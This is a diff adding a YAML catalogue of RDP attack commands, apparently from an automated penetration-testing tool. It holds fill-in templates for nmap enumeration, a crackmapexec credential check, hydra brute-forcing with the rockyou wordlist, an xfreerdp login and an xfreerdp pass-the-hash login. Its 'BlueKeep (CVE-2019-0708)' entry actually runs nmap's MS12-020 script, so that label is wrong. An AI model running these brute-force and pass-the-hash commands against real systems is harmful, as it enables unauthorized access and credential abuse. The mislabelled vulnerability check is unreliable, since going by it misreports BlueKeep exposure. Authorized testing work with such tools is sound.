@@ -1,0 +1,29 @@
+service: rdp
+ports: [3389]
+categories:
+  enumeration:
+    - id: rdp_nmap
+      description: "RDP nmap scripts"
+      command: "nmap --script rdp-ntlm-info,rdp-enum-encryption -p 3389 {IP}"
+      priority: high
+    - id: rdp_check
+      description: "Check RDP access with creds"
+      command: "crackmapexec rdp {IP} -u '{USER}' -p '{PASS}'"
+      priority: high
+  exploitation:
+    - id: rdp_brute
+      description: "Brute force RDP"
+      command: "hydra -l {USER} -P /usr/share/wordlists/rockyou.txt rdp://{IP}"
+      priority: medium
+    - id: rdp_connect
+      description: "Connect via xfreerdp"
+      command: "xfreerdp /v:{IP} /u:{USER} /p:'{PASS}' /cert:ignore +clipboard"
+      priority: high
+    - id: rdp_pth
+      description: "RDP Pass-the-Hash (Restricted Admin)"
+      command: "xfreerdp /v:{IP} /u:{USER} /pth:{HASH} /cert:ignore"
+      priority: high
+    - id: rdp_bluekeep
+      description: "Check BlueKeep (CVE-2019-0708)"
+      command: "nmap --script rdp-vuln-ms12-020 -p 3389 {IP}"
+      priority: medium
